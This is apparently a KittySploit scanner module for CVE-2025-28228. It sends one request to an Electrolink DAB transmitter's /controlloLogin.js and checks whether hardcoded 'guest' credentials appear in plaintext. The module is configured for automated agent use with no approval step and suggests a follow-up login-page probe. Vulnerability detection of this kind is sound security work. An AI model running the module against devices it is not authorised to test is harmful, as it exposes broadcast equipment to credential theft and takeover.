#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A credential exposure vulnerability in Electrolink 500W, 1kW, 2kW Medium DAB Transmitter Web v01."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Electrolink FM/DAB/TV Transmitter - Credentials Disclosure Detection',
        'description': 'A credential exposure vulnerability in Electrolink 500W, 1kW, 2kW Medium DAB Transmitter Web v01.09, v01.08, v01.07, and Display v1.4, v1.2 allows unauthorized attackers to access credentials in plaintext.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'electrolink', 'info-leak', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://github.com/shiky8/my--cve-vulnerability-research/tree/main/CVE-2025-28228'],
        'cve': 'CVE-2025-28228',
    }

    def run(self):
        r = self.http_request(method="GET", path='/controlloLogin.js', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ("user=='guest'", "password=='guest'",)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Electrolink FM/DAB/TV Transmitter - Credentials Disclosure detected",
                path='/controlloLogin.js',
            )
            return True
        return False

